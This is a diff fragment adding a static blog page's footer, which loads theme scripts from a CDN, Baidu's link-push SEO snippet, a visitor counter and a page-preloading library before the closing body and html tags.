+    <script src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+	
+    
+
+    
+
+    
+
+    
+    <script src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
